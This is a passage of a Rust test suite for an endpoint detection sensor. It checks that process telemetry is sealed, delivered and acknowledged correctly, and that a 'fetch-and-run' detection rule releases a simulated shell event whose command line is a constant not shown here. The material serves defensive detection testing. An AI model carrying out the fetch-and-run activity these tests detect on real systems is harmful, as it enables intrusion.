        let mut command_line = vec![executable_path.to_string()];
        command_line.extend(arguments.iter().map(|argument| argument.to_string()));
        SensorEvent::Process(ProcessEvent {
            timestamp: 1_000 + pid as u64,
            pid,
            ppid,
            executable_path: executable_path.to_string(),
            command_line,
            action: ProcessAction::Create,
            uid: 0,
            hash: None,
        })
    }

    fn every_50_milliseconds() -> SensorIntervals {
        SensorIntervals { poll: Duration::from_millis(50), persistence: Duration::from_secs(60), packages: Duration::from_secs(300) }
    }

    fn no_prover() -> ProverSettings {
        ProverSettings { program: None, max_events: DEFAULT_PROOF_EVENTS as usize, rest: Duration::ZERO, retry_after: PROOF_RETRY_AFTER }
    }

    fn stand_in_prover(dir: &std::path::Path, script: &str) -> ProverSettings {
        let program = dir.join("zedr-prover");
        std::fs::write(&program, format!("#!/bin/sh\n{}\n", script)).unwrap();
        std::fs::set_permissions(&program, std::fs::Permissions::from_mode(0o755)).unwrap();
        ProverSettings { program: Some(program), max_events: DEFAULT_PROOF_EVENTS as usize, rest: Duration::ZERO, retry_after: Duration::from_secs(1) }
    }

    fn short_refusal_wait() -> RefusalWait {
        RefusalWait { first: Duration::from_millis(50), limit: Duration::from_millis(50) }
    }

    fn start(runtime: &Arc<Runtime<Arc<TestPlatform>>>, source: &ScriptedSource) {
        runtime.start_sensor_with(source.clone(), every_50_milliseconds(), no_prover(), short_refusal_wait());
    }

    fn stop(runtime: &Runtime<Arc<TestPlatform>>, dir: &std::path::Path) {
        runtime.notify_stopping(StopReason::ServiceStop);
        std::fs::remove_dir_all(dir).unwrap();
    }

    fn offered(server: &StubServer) -> Vec<(u16, SealedWindow)> {
        server.received.lock().unwrap().iter().filter(|request| request.path == "/api/windows").map(|request| (request.answer, sent_window(request))).collect()
    }

    fn taken(server: &StubServer) -> Vec<SealedWindow> {
        offered(server).into_iter().filter(|(answer, _)| *answer == 200).map(|(_, window)| window).collect()
    }

    fn receipts(server: &StubServer) -> Vec<Vec<u8>> {
        server.requests_to("/api/proofs").iter().map(|proof| bytes_from_base64(proof["receipt"].as_str().unwrap()).unwrap()).collect()
    }

    fn window_file(dir: &std::path::Path, window: u64) -> PathBuf {
        dir.join("ledger").join("windows").join(format!("{:020}.bin", window))
    }

    fn sealed_files(dir: &std::path::Path) -> usize {
        std::fs::read_dir(dir.join("ledger").join("windows")).unwrap().count()
    }

    fn proof_files(dir: &std::path::Path, kind: &str) -> Vec<PathBuf> {
        let Ok(written) = std::fs::read_dir(dir.join("ledger").join("proofs")) else {
            return Vec::new();
        };
        let named = |path: &PathBuf| path.file_name().and_then(|name| name.to_str()).is_some_and(|name| name.starts_with(kind) && name.ends_with(".bin"));
        written.filter_map(|entry| entry.ok()).map(|entry| entry.path()).filter(named).collect()
    }

    fn agent_hash(dir: &std::path::Path) -> Hash {
        let stored: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(dir.join("identity.json")).unwrap()).unwrap();
        let seed: [u8; 32] = hex::decode(stored["seed"].as_str().unwrap()).unwrap().try_into().unwrap();
        Sha256::digest(SigningKey::from_bytes(&seed).verifying_key().to_bytes()).into()
    }

    fn opened(agent: &Hash, window: &SealedWindow) -> BTreeMap<u64, SensorEvent> {
        let seeds: Vec<Hash> = window.releases.iter().flat_map(|release| &release.openings).map(|opening| hash_from_hex(&opening.seed).unwrap()).collect();
        let mut opened = BTreeMap::new();
        for (offset, event) in window.events.iter().enumerate() {
            let index = window.header.first_index + offset as u64;
            let sealed = bytes_from_base64(&event.sealed).unwrap();
            for seed in &seeds {
                if let Ok(bytes) = seal::open(seed, agent, window.header.epoch, index, &sealed) {
                    assert_eq!(
                        hash_to_hex(&leaf(agent, window.header.epoch, index, &seal::blind(seed), &bytes)),
                        event.leaf,
                        "what opens is what the leaf commits to"
                    );
                    opened.insert(index, SensorEvent::from_bytes(&bytes).unwrap());
                }
            }
        }
        opened
    }

    fn wait_until(condition: impl Fn() -> bool) -> bool {
        let deadline = Instant::now() + Duration::from_secs(10);
        while Instant::now() < deadline {
            if condition() {
                return true;
            }
            thread::sleep(Duration::from_millis(20));
        }
        false
    }

    #[test]
    fn test_quiet_activity_reaches_the_server_only_sealed() {
        let server = StubServer::start(accept_everything);
        let dir = state_dir("sensor-quiet");
        let (runtime, platform) = runtime(&server, &dir);

        start(&runtime, &ScriptedSource::with(1_200));
        assert!(wait_until(|| taken(&server).len() == 1), "a full window does not wait for its minute");
        runtime.tick();
        runtime.notify_stopping(StopReason::ServiceStop);

        let windows = taken(&server);
        assert_eq!(
            windows.iter().map(|window| (window.header.window, window.header.first_index, window.header.count)).collect::<Vec<_>>(),
            vec![(0, 0, 1000), (1, 1000, 200)]
        );
        assert!(windows[0].header.fresh && !windows[1].header.fresh);
        assert_eq!(windows[1].header.prev_head, windows[0].header.head);
        for window in &windows {
            assert!(window.releases.is_empty() && !window.header.gap && !window.proving);
            assert_eq!(window.events.len(), window.header.count as usize);
            assert!(window
                .events
                .iter()
                .all(|event| event.leaf.len() == 64 && seal::BUCKETS.contains(&(bytes_from_base64(&event.sealed).unwrap().len() - 16))));
        }

        let received = server.received.lock().unwrap();
        for request in received.iter() {
            for plaintext in ["program-", "secret-", "/usr/bin/"] {
                assert!(!request.body.contains(plaintext), "{} left the endpoint in a request to {}", plaintext, request.path);
            }
        }
        let unsealed: Vec<serde_json::Value> =
            received.iter().filter(|request| request.path == "/api/events").flat_map(|request| request.json()["events"].as_array().cloned().unwrap()).collect();
        assert_eq!(unsealed.len(), 2);
        assert!(unsealed[0].get("Heartbeat").is_some() && unsealed[1].get("AgentStopping").is_some(), "nothing the sensor saw goes to the event endpoint");
        drop(received);
        assert!(platform.logged("Sensor started, 1200 processes, 0 persistence items and 0 packages"));

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_link_does_not_send_what_the_sensor_saw_unsealed() {
        let server = StubServer::start(accept_everything);
        let dir = state_dir("sensor-unsealed");
        let link = ControlLink::open_with_key_id(server.url.clone(), &dir).unwrap();
        let heartbeat = SystemEvent::Heartbeat(HeartbeatEvent { timestamp: 1 });

        let refused = link.send_events(vec![heartbeat.clone(), started(7, 1, "/usr/bin/program-7", &[]).into()], EVENT_TIMEOUT_SECS).unwrap_err();
        assert_eq!(refused, "Sensor events are not sent unsealed");
        assert!(server.received.lock().unwrap().is_empty(), "nothing of the batch left the endpoint");

        assert_eq!(link.send_events(vec![heartbeat], EVENT_TIMEOUT_SECS).unwrap().status_code, 200);

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_event_that_matches_a_rule_is_released_at_once_and_nothing_else_of_its_window_opens() {
        let server = StubServer::start(accept_everything);
        let dir = state_dir("sensor-match");
        let (runtime, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(5);

        start(&runtime, &source);
        assert!(wait_until(|| platform.logged("Sensor started, 5 processes")));
        source.run(900, 3, SHELL, &FETCH_AND_RUN);
        assert!(wait_until(|| !taken(&server).is_empty()), "a window with a finding does not wait for its minute");

        let window = taken(&server).remove(0);
        assert_eq!((window.header.window, window.header.count, window.header.fresh, window.proving), (0, 6, true, false));
        assert_eq!(window.releases.len(), 1);
        let release = &window.releases[0];
        assert_eq!((release.rule.as_str(), release.trigger, &release.context, release.pid, release.started_at), ("fetch-and-run", 5, &vec![2], 900, 1_900));
        assert_eq!(release.openings.iter().map(|opening| opening.index).collect::<Vec<_>>(), vec![5, 2]);
        assert_eq!(
            opened(&agent_hash(&dir), &window),
            BTreeMap::from([(2, started(3, 2, "/usr/bin/program-3", &["--token=secret-3"])), (5, started(900, 3, SHELL, &FETCH_AND_RUN))]),
            "the finding and its parent open, the four events around them stay sealed"
        );

        assert!(wait_until(|| !window_file(&dir, 0).exists()), "without a prover the plaintext goes once the server has the window");
        assert!(server.requests_to("/api/events").is_empty() && server.requests_to("/api/proofs").is_empty());

        stop(&runtime, &dir);
    }

    #[test]
    fn test_sealed_windows_wait_for_the_server_to_accept_the_agent() {
        let accepting = Arc::new(Mutex::new(false));
        let gate = Arc::clone(&accepting);
        let server = StubServer::start(move |request| if *gate.lock().unwrap() { accept_everything(request) } else { (401, "{}".to_string()) });
        let dir = state_dir("sensor-queued");
        let (runtime, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(3);
        source.run(900, 3, SHELL, &FETCH_AND_RUN);

        start(&runtime, &source);
        assert!(wait_until(|| platform.logged("Sensor windows are queued, 1 waiting: HTTP 401")));

        *accepting.lock().unwrap() = true;
        assert!(wait_until(|| platform.logged("Sensor windows are being delivered again")));
        assert_eq!(
            taken(&server).iter().map(|window| (window.header.window, window.header.count)).collect::<Vec<_>>(),
            vec![(0, 4)],
            "the queued window arrives once and complete"
        );

        stop(&runtime, &dir);
    }

    #[test]
    fn test_window_the_server_does_not_take_stays_on_disk_and_is_offered_again() {
        for status in [400, 401, 403, 409, 413, 422, 500, 503] {
            let server = StubServer::start(move |_| (status, "{}".to_string()));
            let dir = state_dir(&format!("sensor-kept-{}", status));
            let (runtime, platform) = runtime(&server, &dir);
            let source = ScriptedSource::with(3);
            source.run(900, 3, SHELL, &FETCH_AND_RUN);

            start(&runtime, &source);
            assert!(wait_until(|| platform.logged(&format!("Sensor windows are queued, 1 waiting: HTTP {}", status))));
            assert!(wait_until(|| offered(&server).len() >= 3), "it is offered again on every round");
            assert!(offered(&server).iter().all(|(_, window)| window.header.window == 0 && window.header.count == 4), "whole, and nothing is sent past it");
            assert!(window_file(&dir, 0).exists());
            assert!(!platform.logged("discarded"));

            stop(&runtime, &dir);
        }
    }

    #[test]
    fn test_windows_wait_on_disk_while_the_server_is_away_and_arrive_in_order_also_after_a_restart() {
        let answering = Arc::new(Mutex::new(false));
        let gate = Arc::clone(&answering);
        let server = StubServer::start(move |request| if *gate.lock().unwrap() { accept_everything(request) } else { (503, "{}".to_string()) });
        let dir = state_dir("sensor-away");
        let (first, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(3);
        source.run(900, 3, SHELL, &FETCH_AND_RUN);

        start(&first, &source);
        assert!(wait_until(|| platform.logged("Sensor windows are queued, 1 waiting: HTTP 503")));
        source.run(901, 2, SHELL, &FETCH_AND_RUN);
        assert!(wait_until(|| window_file(&dir, 1).exists()));
        first.notify_stopping(StopReason::ServiceStop);
        assert!((0..3).all(|window| window_file(&dir, window).exists()), "what was sealed waits on disk, the stop sealed the last window");
        let refused = offered(&server);
        assert!(refused.iter().all(|(answer, window)| *answer == 503 && window.header.window == 0), "nothing is sent past a window the server did not take");

        *answering.lock().unwrap() = true;
        let (second, _) = runtime(&server, &dir);
        start(&second, &source);
        assert!(wait_until(|| taken(&server).len() >= 4));

        let windows = taken(&server);
        assert_eq!(windows.iter().map(|window| (window.header.epoch, window.header.window)).collect::<Vec<_>>()[..4], [(1, 0), (1, 1), (1, 2), (2, 3)]);
        assert!(windows.windows(2).all(|pair| pair[1].header.prev_head == pair[0].header.head));
        assert_eq!(
            (&windows[0].header, &windows[0].events, &windows[0].releases),
            (&refused[0].1.header, &refused[0].1.events, &refused[0].1.releases),
            "byte for byte the window the server did not take before the restart"
        );
        assert_eq!(
            opened(&agent_hash(&dir), &windows[1]),
            BTreeMap::from([(4, started(901, 2, SHELL, &FETCH_AND_RUN))]),
            "a window sealed before the restart opens with what was released then"
        );
        assert!(windows[3].header.fresh && windows[3].releases.len() == 2, "the restarted sensor reports everything again and the rules start over");
        assert!(wait_until(|| (0..4).all(|window| !window_file(&dir, window).exists())));

        stop(&second, &dir);
    }

    #[derive(Clone, Copy)]
    enum Ack {
        ByAnotherKey,
        ForAnotherWindow,
        ForAnotherHead,
        Honest,
    }

    #[test]
    fn test_acknowledgement_that_is_not_the_deployments_word_for_this_window_is_not_accepted() {
        let kind = Arc::new(Mutex::new(Ack::ByAnotherKey));
        let answer = Arc::clone(&kind);
        let server = StubServer::start(move |request| {
            if request.path != "/api/windows" {
                return (200, "{}".to_string());
            }
            let window = sent_window(request);
            let (number, next_index, head) = (window.header.window, window.header.first_index + u64::from(window.header.count), window.header.head.as_str());
            match *answer.lock().unwrap() {
                Ack::ByAnotherKey => signed_ack(&SigningKey::from_bytes(&[8u8; 32]), &window.agent_id, number, next_index, head),
                Ack::ForAnotherWindow => signed_ack(&deployment_key(), &window.agent_id, number + 1, next_index, head),
                Ack::ForAnotherHead => signed_ack(&deployment_key(), &window.agent_id, number, next_index, &"ab".repeat(32)),
                Ack::Honest => signed_ack(&deployment_key(), &window.agent_id, number, next_index, head),
            }
        });
        let dir = state_dir("sensor-forged-ack");
        let (runtime, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(3);
        source.run(900, 3, SHELL, &FETCH_AND_RUN);

        start(&runtime, &source);
        assert!(wait_until(|| platform.logged("Sensor windows are queued, 1 waiting: Window acknowledgement is not signed by this deployment")));
        for forged in [Ack::ForAnotherWindow, Ack::ForAnotherHead] {
            *kind.lock().unwrap() = forged;
            let before = offered(&server).len();
            assert!(wait_until(|| offered(&server).len() >= before + 3));
            assert!(platform.logged("Sensor windows are queued, 1 waiting: Window acknowledgement is for another window than window 0"));
        }
        assert!(offered(&server).iter().all(|(_, window)| window.header.window == 0), "the window is offered again until the deployment acknowledges it");
        assert!(window_file(&dir, 0).exists());
        assert!(!platform.logged("delivered again"));

        *kind.lock().unwrap() = Ack::Honest;
        assert!(wait_until(|| platform.logged("Sensor windows are being delivered again")));
        assert!(wait_until(|| !window_file(&dir, 0).exists()));

        stop(&runtime, &dir);
    }

    #[test]
    fn test_signed_refusal_makes_the_agent_start_over_where_the_server_stands_and_one_signed_for_another_request_does_not() {
        let head = "07".repeat(32);
        let for_this_request = Arc::new(Mutex::new(false));
        let (gate, signed_head) = (Arc::clone(&for_this_request), head.clone());
        let server = StubServer::start(move |request| {
            if request.path != "/api/windows" {
                return (200, "{}".to_string());
            }
            let window = sent_window(request);
            if window.header.window >= 40 {
                return acknowledge(request);
            }
            let seq = if *gate.lock().unwrap() { window.seq } else { window.seq - 1 };
            signed_refusal(&deployment_key(), 409, &window, seq, (57, 40, 900, &signed_head))
        });
        let dir = state_dir("sensor-rebase");
        let (runtime, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(3);
        source.run(900, 3, SHELL, &FETCH_AND_RUN);

        start(&runtime, &source);
        assert!(
            wait_until(|| platform.logged("Sensor windows are queued, 1 waiting: Window refusal is not signed by this deployment")),
            "a refusal signed for an earlier request moves nothing"
        );
        assert!(wait_until(|| offered(&server).len() >= 3));
        assert!(offered(&server).iter().all(|(_, window)| window.header.window == 0 && window.header.epoch == 1) && window_file(&dir, 0).exists());

        *for_this_request.lock().unwrap() = true;
        assert!(wait_until(|| !taken(&server).is_empty()));
        let window = taken(&server).remove(0);
        assert!(window.header.fresh && window.header.gap);
        assert_eq!(
            (window.header.epoch, window.header.window, window.header.first_index, window.header.count, &window.header.prev_head),
            (58, 40, 900, 4, &head),
            "the sensor reported everything again, from where the server stands and in an epoch later than the one it holds"
        );
        assert_eq!(
            opened(&agent_hash(&dir), &window),
            BTreeMap::from([(902, started(3, 2, "/usr/bin/program-3", &["--token=secret-3"])), (903, started(900, 3, SHELL, &FETCH_AND_RUN))]),
            "the rules started over and found it again"
        );
        assert!(platform.logged("Sensor windows are queued, 0 waiting: Server refused window 0, starting over at its window 40 and sending again in 0s"));
        assert!(wait_until(|| platform.logged("Sensor windows are being delivered again")));
        assert!(!window_file(&dir, 0).exists(), "the window the server refused is gone");

        stop(&runtime, &dir);
    }

    #[derive(Clone, Copy)]
    enum Malformed {
        Unsigned,
        ByAnotherKey,
        Signed,
        Taken,
    }

    #[test]
    fn test_signed_refusal_of_a_malformed_window_is_followed_like_any_other_and_an_unsigned_one_changes_nothing() {
        let kind = Arc::new(Mutex::new(Malformed::Unsigned));
        let answer = Arc::clone(&kind);
        let server = StubServer::start(move |request| {
            if request.path != "/api/windows" {
                return (200, "{}".to_string());
            }
            let window = sent_window(request);
            let mut answer = answer.lock().unwrap();
            match *answer {
                Malformed::Unsigned => (422, r#"{"error":"Window 0 root does not match its leaves"}"#.to_string()),
                Malformed::ByAnotherKey => signed_refusal(&SigningKey::from_bytes(&[8u8; 32]), 422, &window, window.seq, where_it_starts(&window)),
                Malformed::Signed => {
                    *answer = Malformed::Taken;
                    signed_refusal(&deployment_key(), 422, &window, window.seq, where_it_starts(&window))
                }
                Malformed::Taken => acknowledge(request),
            }
        });
        let dir = state_dir("sensor-malformed");
        let (runtime, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(3);
        source.run(900, 3, SHELL, &FETCH_AND_RUN);

        start(&runtime, &source);
        assert!(wait_until(|| platform.logged("Sensor windows are queued, 1 waiting: HTTP 422 without a signed refusal")));
        *kind.lock().unwrap() = Malformed::ByAnotherKey;
        assert!(wait_until(|| platform.logged("Sensor windows are queued, 1 waiting: Window refusal is not signed by this deployment")));
        let refused = offered(&server);
        assert!(
            refused.len() >= 2
                && refused.iter().all(|(answer, window)| *answer == 422 && (window.header.window, window.header.epoch, window.header.gap) == (0, 1, false)),
            "the window is offered again as it is"
        );
        assert!(window_file(&dir, 0).exists());

        *kind.lock().unwrap() = Malformed::Signed;
        assert!(wait_until(|| !taken(&server).is_empty()));
        let window = taken(&server).remove(0);
        assert!(window.header.fresh && window.header.gap);
        assert_eq!(
            (window.header.epoch, window.header.window, window.header.first_index, window.header.count, &window.header.prev_head),
            (2, 0, 0, 4, &refused[0].1.header.prev_head),
            "the chain continues where the server stands, and the sensor reported everything again"
        );
        assert_eq!(window.releases.len(), 1, "the rules started over and found it again");

        source.run(901, 2, SHELL, &FETCH_AND_RUN);
        assert!(wait_until(|| taken(&server).len() == 2), "telemetry goes on");
        let next = taken(&server).remove(1);
        assert_eq!((next.header.window, next.header.fresh, &next.header.prev_head), (1, false, &window.header.head));

        stop(&runtime, &dir);
    }

    #[test]
    fn test_wait_after_a_refusal_doubles_up_to_its_limit_and_starts_over_after_an_accepted_window() {
        let mut refusals = Refusals::new(RefusalWait { first: REFUSAL_WAIT_START, limit: REFUSAL_WAIT_LIMIT });
        let mut now = Instant::now();
        assert_eq!(refusals.holding(now, 1), None);

        for seconds in [60, 120, 240, 480, 960, 1920, 3600, 3600] {
            let said = refusals.refused(now, 7, 5);
            assert_eq!(said, format!("Server refused window 7, starting over at its window 5 and sending again in {}s", seconds));
            assert_eq!(refusals.holding(now + Duration::from_secs(seconds - 1), 1), Some(said.clone()));
            now += Duration::from_secs(seconds);
            assert_eq!(refusals.holding(now, 0), Some(said), "with nothing to send the refusal is still the last word");
            assert_eq!(refusals.holding(now, 1), None, "a window is sent again once the wait is over");
        }

        refusals.accepted();
        assert_eq!(refusals.holding(now, 0), None);
        assert!(refusals.refused(now, 8, 8).ends_with("sending again in 60s"));
    }

    #[test]
    fn test_windows_are_kept_back_longer_after_every_refusal_in_a_row_and_an_accepted_one_ends_that() {
        let refusing = Arc::new(Mutex::new(3));
        let left = Arc::clone(&refusing);
        let server = StubServer::start(move |request| {
            if request.path != "/api/windows" {
                return (200, "{}".to_string());
            }
            let mut left = left.lock().unwrap();
            if *left == 0 {
                return acknowledge(request);
            }
            *left -= 1;
            let window = sent_window(request);
            signed_refusal(&deployment_key(), 409, &window, window.seq, where_it_starts(&window))
        });
        let dir = state_dir("sensor-refused");
        let (runtime, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(3);
        source.run(900, 3, SHELL, &FETCH_AND_RUN);
        let first = Duration::from_millis(150);
        let asked = || -> Vec<(u16, Instant)> {
            server.received.lock().unwrap().iter().filter(|request| request.path == "/api/windows").map(|request| (request.answer, request.at)).collect()
        };

        runtime.start_sensor_with(source.clone(), every_50_milliseconds(), no_prover(), RefusalWait { first, limit: Duration::from_secs(60) });
        assert!(wait_until(|| taken(&server).len() == 1));
        let requests = asked();
        assert_eq!(
            requests.iter().map(|(answer, _)| *answer).collect::<Vec<_>>(),
            vec![409, 409, 409, 200],
            "a refused window is not sent again, the next one is"
        );
        let waited: Vec<Duration> = requests.windows(2).map(|pair| pair[1].1 - pair[0].1).collect();
        assert!(
            waited[0] >= first && waited[1] >= first * 2 && waited[2] >= first * 4,
            "every refusal in a row keeps windows back twice as long: {:?}",
            waited
        );
        assert_eq!(
            offered(&server).iter().map(|(_, window)| (window.header.epoch, window.header.window)).collect::<Vec<_>>(),
            vec![(1, 0), (2, 0), (3, 0), (4, 0)]
        );
        assert!(platform.logged("Server refused window 0, starting over at its window 0"));
        assert!(wait_until(|| platform.logged("Sensor windows are being delivered again")));

        *refusing.lock().unwrap() = 1;
        source.run(901, 2, SHELL, &FETCH_AND_RUN);
        assert!(wait_until(|| taken(&server).len() == 2));
        let requests = asked();
        assert_eq!(requests[4..].iter().map(|(answer, _)| *answer).collect::<Vec<_>>(), vec![409, 200]);
        let waited = requests[5].1 - requests[4].1;
        assert!(waited >= first && waited < first * 8, "after an accepted window the wait is the first one again: {:?}", waited);

        stop(&runtime, &dir);
    }

    #[test]
    fn test_agents_open_their_link_on_the_key_in_their_binary_and_never_on_one_they_are_given() {
        let agents = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).parent().unwrap();
        for platform in ["linux", "macos", "windows"] {
            for source in std::fs::read_dir(agents.join(platform).join("src")).unwrap() {
                let source = source.unwrap().path();
                assert!(
                    !std::fs::read_to_string(&source).unwrap().contains("open_trusting"),
                    "{} opens a link that trusts a key it is given",
                    source.display()
                );
            }
        }

        let server = StubServer::start(accept_everything);
        let dir = state_dir("link-unpatched");
        let opened_by_agents =
            [ControlLink::open_with_key_id(server.url.clone(), &dir).unwrap(), ControlLink::open(server.url.clone(), &dir, "agent-a".to_string()).unwrap()];
        for link in opened_by_agents {
            let mut ledger = link.open_ledger(1_000).unwrap();
            ledger.seal_now(1_001).unwrap();
            let window = ledger.next_undelivered().unwrap().unwrap();
            let refused = link.send_window(&window, false, EVENT_TIMEOUT_SECS).unwrap_err();
            assert!(refused.contains("not been patched"), "{}", refused);
        }
        assert!(server.received.lock().unwrap().is_empty(), "a link that trusts no key sends no window");

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_what_the_sensor_saw_is_delivered_before_the_stop_notice() {
        let server = StubServer::start(accept_everything);
        let dir = state_dir("sensor-stop");
        let (runtime, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(3);

        start(&runtime, &source);
        assert!(wait_until(|| platform.logged("Sensor started, 3 processes")));
        source.run(4, 3, "/usr/bin/program-4", &[]);
        runtime.notify_stopping(StopReason::SystemShutdown);

        let received = server.received.lock().unwrap();
        assert_eq!(received.iter().map(|request| request.path.as_str()).collect::<Vec<_>>(), vec!["/api/windows", "/api/events"]);
        let window = sent_window(&received[0]);
        assert_eq!((window.header.window, window.header.count, window.header.fresh), (0, 4, true), "the process that started just before the stop is in it");
        assert_eq!(received[1].json()["events"][0]["AgentStopping"]["reason"], "SystemShutdown");
        drop(received);
        assert!(!window_file(&dir, 0).exists());

        runtime.notify_stopping(StopReason::SystemShutdown);
        assert_eq!(offered(&server).len(), 1, "the sensor ended with its last window");

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_backlog_the_server_never_takes_stays_bounded_and_the_chain_continues_where_the_server_stands() {
        let answering = Arc::new(Mutex::new(true));
        let gate = Arc::clone(&answering);
        let server = StubServer::start(move |request| if *gate.lock().unwrap() { accept_everything(request) } else { (503, "{}".to_string()) });
        let dir = state_dir("sensor-backlog");
        let (runtime, _) = runtime(&server, &dir);
        let mut ledger = runtime.link.open_ledger(1_000).unwrap().keeping_undelivered(3);
        let mut prover = Prover::new(no_prover(), ledger.dir());
        let mut refusals = Refusals::new(short_refusal_wait());
        let finding = |pid: u32| vec![SystemEvent::from(started(pid, 1, SHELL, &FETCH_AND_RUN))];

        runtime.commit(&mut ledger, finding(900), 1_000, false).unwrap();
        assert_eq!(runtime.deliver(&mut ledger, &mut prover, &mut refusals, false, EVENT_TIMEOUT_SECS), Ok(()));
        let acknowledged = taken(&server).remove(0);

        *answering.lock().unwrap() = false;
        for pid in 901..=910 {
            runtime.commit(&mut ledger, finding(pid), 1_000, false).unwrap();
            assert!(runtime.deliver(&mut ledger, &mut prover, &mut refusals, false, EVENT_TIMEOUT_SECS).is_err() || ledger.undelivered() == 0);
            assert!(sealed_files(&dir) <= 3, "what waits for the server stays bounded");
        }
        let notices = ledger.take_notices();
        assert_eq!(notices.len(), 2, "ten windows, given up every time a fourth one waited");
        assert!(notices
            .iter()
            .all(|notice| notice == "Gave up 4 sealed windows and continue at window 1 with a gap: more than 3 waited for the control server"));
        assert_eq!((ledger.undelivered(), taken(&server).len()), (2, 1));

        *answering.lock().unwrap() = true;
        assert_eq!(runtime.deliver(&mut ledger, &mut prover, &mut refusals, false, EVENT_TIMEOUT_SECS), Ok(()));
        let windows = taken(&server);
        assert!(windows[1].header.fresh && windows[1].header.gap);
        assert_eq!(
            (windows[1].header.window, windows[1].header.first_index, &windows[1].header.prev_head),
            (1, 1, &acknowledged.header.head),
            "the first window the server gets continues the chain it holds"
        );
        assert_eq!((windows.len(), windows[2].header.fresh, &windows[2].header.prev_head), (3, false, &windows[1].header.head));

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_ledger_that_lost_its_chain_or_a_sealed_window_keeps_the_sensor_running_and_says_so() {
        let answering = Arc::new(Mutex::new(true));
        let gate = Arc::clone(&answering);
        let server = StubServer::start(move |request| if *gate.lock().unwrap() { accept_everything(request) } else { (503, "{}".to_string()) });
        let dir = state_dir("sensor-healing");
        std::fs::create_dir_all(dir.join("ledger")).unwrap();
        std::fs::write(dir.join("ledger").join("chain.bin"), b"cut short").unwrap();
        let (runtime, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(3);
        source.run(900, 3, SHELL, &FETCH_AND_RUN);

        start(&runtime, &source);
        assert!(wait_until(|| taken(&server).len() == 1));
        let first = taken(&server).remove(0);
        assert!(first.header.fresh && first.header.gap, "a chain that started over says that what came before is missing");
        assert_eq!((first.header.window, first.header.first_index, first.header.count), (0, 0, 4));

        *answering.lock().unwrap() = false;
        source.run(901, 2, SHELL, &FETCH_AND_RUN);
        assert!(wait_until(|| window_file(&dir, 1).exists()));
        std::fs::remove_file(window_file(&dir, 1)).unwrap();
        assert!(wait_until(
            || platform.logged("Sensor: Gave up 1 sealed windows and continue at window 1 with a gap: window 1 cannot be read, its file is gone")
        ));

        *answering.lock().unwrap() = true;
        assert!(wait_until(|| taken(&server).len() == 2));
        let second = taken(&server).remove(1);
        assert!(second.header.fresh && second.header.gap);
        assert_eq!(
            (second.header.window, second.header.first_index, second.header.count, &second.header.prev_head),
            (1, 4, 5, &first.header.head),
            "the chain continues where the server stands, with everything the sensor sees reported again"
        );
        let said = platform
            .logs
            .lock()
            .unwrap()
            .iter()
            .filter(|line| line.starts_with("Sensor: Ledger chain cannot be used, starting over at the first window with a gap"))
            .count();
        assert_eq!(said, 1);

        stop(&runtime, &dir);
    }

    #[test]
    fn test_sensor_that_does_not_finish_its_last_round_in_time_does_not_hold_the_stop_notice_back() {
        let server = StubServer::start(accept_everything);
        let dir = state_dir("sensor-stuck");
        let (runtime, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(3);

        start(&runtime, &source);
        assert!(wait_until(|| platform.logged("Sensor started, 3 processes")));
        let stuck = source.paused.lock().unwrap();
        runtime.flush_sensor(Duration::from_millis(200));
        assert!(platform.logged("Sensor did not finish its last round in time"));
        runtime.notify_stopping(StopReason::SystemShutdown);
        let sent: Vec<String> = server.received.lock().unwrap().iter().map(|request| request.path.clone()).collect();
        assert_eq!(sent, vec!["/api/events"], "the stop notice left while the sensor was still at its last round");

        drop(stuck);
        assert!(wait_until(|| Arc::strong_count(&runtime) == 1), "the sensor ends once that round is over");
        assert_eq!(taken(&server).len(), 1);

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_event_too_large_to_seal_is_left_out_and_its_window_says_so() {
        let server = StubServer::start(accept_everything);
        let dir = state_dir("sensor-oversized-event");
        let (runtime, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(5);
        source.processes.lock().unwrap()[2].1.command_line = vec!["a".repeat(seal::MAX_EVENT_BYTES)];

        start(&runtime, &source);
        assert!(wait_until(|| platform.logged("Sensor produced 1 events too large to seal, discarded them")));
        runtime.notify_stopping(StopReason::ServiceStop);

        let windows = taken(&server);
        assert_eq!(windows.iter().map(|window| (window.header.count, window.header.gap)).collect::<Vec<_>>(), vec![(4, true)]);

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_delivered_windows_are_proven_without_holding_the_sensor_back_and_then_freed() {
        let server = StubServer::start(accept_everything);
        let dir = state_dir("proving");
        let prover = stand_in_prover(
            &dir,
            r#"while [ ! -e "$0.go" ]; do sleep 0.05; done
[ -e "$0.input" ] || cp "$2" "$0.input"
printf 'receipt of the stand-in' > "$3""#,
        );
        let (runtime, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(3);
        source.run(900, 3, SHELL, &FETCH_AND_RUN);

        runtime.start_sensor_with(source.clone(), every_50_milliseconds(), prover, short_refusal_wait());
        assert!(wait_until(|| proof_files(&dir, "input-0-").len() == 1));
        assert_eq!(std::fs::metadata(&proof_files(&dir, "input-0-")[0]).unwrap().permissions().mode() & 0o777, 0o600);
        assert_eq!(std::fs::metadata(dir.join("ledger").join("proofs")).unwrap().permissions().mode() & 0o777, 0o700);

        source.run(901, 2, SHELL, &FETCH_AND_RUN);
        assert!(wait_until(|| taken(&server).len() == 2), "the sensor does not wait for the prover");
        assert!(taken(&server).iter().all(|window| window.proving));
        assert!(window_file(&dir, 0).exists() && window_file(&dir, 1).exists(), "plaintext is kept until a proof covers it");
        assert!(receipts(&server).is_empty());

        std::fs::write(dir.join("zedr-prover.go"), "").unwrap();
